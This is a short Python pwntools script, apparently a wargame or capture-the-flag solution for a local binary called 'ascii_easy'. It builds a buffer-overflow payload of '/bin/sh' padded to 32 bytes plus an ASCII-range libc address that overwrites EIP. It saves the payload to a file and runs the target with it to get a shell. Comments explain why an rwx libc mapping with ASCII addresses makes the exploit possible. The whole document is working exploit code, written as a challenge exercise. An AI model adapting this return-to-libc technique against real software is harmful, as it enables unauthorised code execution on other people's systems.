#!/usr/bin/env python

import pwn


shellcode = b'/bin/sh'
shellcode += b';'*(32 - len(shellcode))

# Control EIP, yay? EIP/EBP are ascii-bound.
# vmmap shows wx libc mmaped:
#   0x5555e000 0x55702000 0x00000000 rwx /home/ascii_easy/libc-2.15.so
# So find functions with ascii addresses in libc-2.15.so with ascii offsets, yeah?
shellcode += pwn.p32(0x5558eed0) 

with open('payload', 'wb') as fh:
    fh.write(shellcode)

p = pwn.process('./ascii_easy', shellcode)
print(p.recvall())
